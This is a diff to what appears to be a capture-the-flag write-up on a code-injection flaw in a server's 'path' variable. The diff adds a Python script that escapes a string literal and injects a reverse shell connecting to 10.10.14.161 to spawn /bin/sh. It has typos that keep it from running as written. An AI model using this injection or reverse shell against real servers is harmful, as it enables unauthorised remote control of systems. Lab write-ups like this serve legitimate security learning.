@@ -43,6 +43,22 @@ So we can execute code if we format correctly the `path` variable. Therefore, I 
 
 ![](https://i.imgur.com/Mxg9BRw.png)
 
+
+```python
+import requests
+
+proxies = {'http': 'http://127.0.0.1:8080', 'httpss': 'https://127.0.0.1:8080'}
+shell   = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.161",9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''
+
+payload = "'\n"
+payload += shell
+payload += "\nape='"
+
+res = requets.get(url + payload)
+print(res.headers)
+print(res.text)
+```
+
 When the server processes this, the `info` variable will look like this:
 
 > output = 'Document'
